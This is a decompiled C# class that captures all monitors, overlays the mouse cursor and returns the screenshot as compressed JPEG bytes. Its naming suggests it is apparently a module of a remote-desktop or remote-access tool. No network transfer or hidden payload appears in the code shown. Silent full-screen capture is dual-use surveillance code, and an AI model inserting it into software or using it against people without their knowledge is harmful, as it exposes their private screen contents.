using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Session1.desktop;

public class simpledesktop
{
	private struct CURSORINFO
	{
		public int cbSize;

		public int flags;

		public IntPtr hCursor;

		public POINTAPI ptScreenPos;
	}

	private struct POINTAPI
	{
		public int x;

		public int y;
	}

	private ImageCodecInfo m_ImageCodecInfo;

	private long m_ImageQuality = 40L;

	private Rectangle bounds;

	private Size ScreenDESKTOP;

	private const int CURSOR_SHOWING = 1;

	private const int DI_NORMAL = 3;

	private const int DESKTOPVERTRES = 117;

	private const int DESKTOPHORZRES = 118;

	public static Size DESKTOP
	{
		get
		{
			IntPtr dC = GetDC(IntPtr.Zero);
			Size result = default(Size);
			result.Width = GetDeviceCaps(dC, 118);
			result.Height = GetDeviceCaps(dC, 117);
			ReleaseDC(IntPtr.Zero, dC);
			return result;
		}
	}

	public simpledesktop()
	{
		bounds = Screen.get_AllScreens()[0].get_Bounds();
		ScreenDESKTOP = DESKTOP;
		GetCodecInfo("image/jpeg");
	}

	private void GetCodecInfo(string mimeType)
	{
		try
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			foreach (ImageCodecInfo val in imageEncoders)
			{
				if (val.get_MimeType() == mimeType)
				{
					m_ImageCodecInfo = val;
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private byte[] ImageToBytes(Image image)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		if (image == null)
		{
			return null;
		}
		byte[] array = null;
		try
		{
			EncoderParameters val = new EncoderParameters(1);
			try
			{
				EncoderParameter val2 = new EncoderParameter(Encoder.Quality, m_ImageQuality);
				try
				{
					val.get_Param()[0] = val2;
					using MemoryStream memoryStream = new MemoryStream();
					image.Save((Stream)memoryStream, m_ImageCodecInfo, val);
					memoryStream.Seek(0L, SeekOrigin.Begin);
					array = new byte[memoryStream.Length];
					memoryStream.Read(array, 0, array.Length);
					memoryStream.Close();
					image.Dispose();
					return array;
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception)
		{
			return array;
		}
	}

	private Image CaptureScreenshotsImage()
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		try
		{
			Screen[] allScreens = Screen.get_AllScreens();
			int num = 0;
			int val = 0;
			for (int i = 0; i < allScreens.Length; i++)
			{
				num += allScreens[i].get_Bounds().Width;
				val = Math.Max(val, allScreens[i].get_Bounds().Height);
			}
			num = Math.Max(num, ScreenDESKTOP.Width);
			val = Math.Max(val, ScreenDESKTOP.Height);
			Bitmap val2 = new Bitmap(num, val, (PixelFormat)2498570);
			Graphics val3 = Graphics.FromImage((Image)(object)val2);
			try
			{
				int num2 = 0;
				int num3 = 0;
				if (allScreens.Length == 1)
				{
					val3.CopyFromScreen(0, 0, 0, 0, ScreenDESKTOP);
				}
				else
				{
					for (int j = 0; j < allScreens.Length; j++)
					{
						Screen val4 = Screen.get_AllScreens()[j];
						val3.CopyFromScreen(val4.get_Bounds().X, val4.get_Bounds().Y, num2, num3, val4.get_Bounds().Size);
						num2 += val4.get_Bounds().Width;
					}
				}
				CURSORINFO pci = default(CURSORINFO);
				pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
				if (GetCursorInfo(out pci) && pci.flags == 1)
				{
					DrawIconEx(val3.GetHdc(), pci.ptScreenPos.x - bounds.X, pci.ptScreenPos.y - bounds.Y, pci.hCursor, 0, 0, 0, IntPtr.Zero, 3);
					val3.ReleaseHdc();
				}
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
			return (Image)(object)val2;
		}
		catch (Exception)
		{
		}
		return null;
	}

	private Image GetScreen()
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		Bitmap val = new Bitmap(ScreenDESKTOP.Width, ScreenDESKTOP.Height);
		try
		{
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.CopyFromScreen(new Point(0, 0), new Point(0, 0), ScreenDESKTOP);
				CURSORINFO pci = default(CURSORINFO);
				pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
				if (GetCursorInfo(out pci))
				{
					if (pci.flags == 1)
					{
						DrawIconEx(val2.GetHdc(), pci.ptScreenPos.x - bounds.X, pci.ptScreenPos.y - bounds.Y, pci.hCursor, 0, 0, 0, IntPtr.Zero, 3);
						val2.ReleaseHdc();
						return (Image)(object)val;
					}
					return (Image)(object)val;
				}
				return (Image)(object)val;
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch (Exception)
		{
			return (Image)(object)val;
		}
	}

	public byte[] CaptureScreenshots()
	{
		return ImageToBytes(CaptureScreenshotsImage());
	}

	[DllImport("user32.dll")]
	private static extern bool GetCursorInfo(out CURSORINFO pci);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyHeight, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);

	[DllImport("user32.dll")]
	private static extern IntPtr GetDC(IntPtr ptr);

	[DllImport("gdi32.dll")]
	private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

	[DllImport("user32.dll")]
	private static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDc);
}
